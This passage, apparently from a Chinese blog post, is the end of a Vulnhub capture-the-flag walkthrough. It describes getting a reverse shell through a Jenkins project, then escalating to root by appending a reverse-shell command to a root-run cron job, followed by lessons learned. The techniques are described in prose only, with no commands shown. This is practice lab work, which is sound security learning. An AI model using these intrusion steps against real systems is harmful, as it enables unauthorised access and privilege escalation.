now，成功建立项目并执行命令，kali中之前监听的端口接收到了反弹shell，拿到了初始立足点jenkins的shell\n\n提权。发现此时jenkins的shell权限很低，我们企图寻找以高权限运行的脚本，企图修改脚本，在其中添加我们的“恶意指令”，最终实现提权。最终发现了以root权限运行的定时任务。在其中追加了反弹root的shell的指令，并在kali中另起一个终端监听端口，成功拿到了root权限的shell。\n\n\n这个靶机也不算难。但在打靶的过程还是涉及到了一些脑洞和知识点。我感觉不太容易想到的地方和启发有如下几点：\n\n网站目录扫描的时候，默认不带参数，是无法扫出access.html页面的，如果卡在这里就完全走不下去了。因此做网站目录扫描的时候，如果一次扫不出结果，可以添加一些参数，或使用多种扫描工具，尽可能多获得一些信息。\n\n拿到access.html页面的三个用户名和密码并尝试登录8080端口失败后，是怎么想到用户名和密码可能不对应的？这里需要经验、脑洞。同时也启发我们，当信息有限且无法利用的时候（我们只有这三个用户名和密码，但对应登录都不对），可以尽可能的尝试利用有限的信息。\n\n漏洞利用的时候，如果对Jenkins这个cms并不了解，如何进行渗透。这里考察了大家的信息检索能力，如何检索漏洞信息。当然，本文写道可以利用robots信息的提示，但我感觉这个提示还是略显牵强，如果我不了解Jenkins，不看红队笔记大佬视频，也不知道搜索出来的漏洞利用exp如何跑，还是很难进行下一步。而主观上对web界面进行探索，观察可能存在漏洞的位置也是不错的思路。\n\n提权的时候，咋想到用crontab定时任务的。需要一些经验，也需要对提权有所了解才行。还是要了解提权的核心思路：以低权限修改可执行文件&#x2F;脚本，却以高权限运行可执行文件&#x2F;脚本。\n\n\n","tags":["Vulnhub"]}]